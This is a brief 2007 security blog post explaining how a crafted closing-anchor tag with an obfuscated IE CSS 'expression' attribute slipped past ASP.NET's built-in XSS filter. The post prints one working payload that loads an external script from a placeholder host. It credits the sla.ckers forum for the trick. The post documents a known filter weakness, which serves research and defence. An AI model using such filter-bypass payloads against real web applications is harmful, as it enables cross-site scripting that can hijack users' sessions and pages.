---
archive: https://wayback.archive-it.org/22123/20231101171300/https://eve.gd/2007/05/15/bypass-asp-net-xss-protection-in-internet-explorer
categories:
- Technology
- InfoSec
- .NET
comments: []
date: 2007-05-15 14:03:24 +0200
date_gmt: 2007-05-15 14:03:24 +0200
doi: https://doi.org/10.59348/2sw0m-svg07
image:
  feature: geek.png
layout: post
ogImage: geek.png
published: true
status: publish
tags:
- information security
- .NET
title: Bypass ASP.NET XSS Protection in Internet Explorer
wordpress_id: 290
wordpress_url: http://pro.grammatic.org/post-bypass-aspnet-xss-protection-in-internet-explorer-8.aspx
---

<p>ASP.NET comes preloaded with some default XSS protection which is actually pretty nifty. However, it turns out that the system can be circumvented by a variety of methods, as illustrated by this test input:</p>

{% highlight html %}
	</a style="xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://www.site.com/JS.js')">
{% endhighlight %}

<p>Turns out that IE will still process attributes on closing tags which circumvents the filter for &lt;a whilst also treating /**/ as a null comment but obviously breaking .NET's filter regex. Thanks to Hong @ <a href="http://sla.ckers.org/forum/read.php?2,7462,8409%23msg-8409">sla.ckers</a>.</p>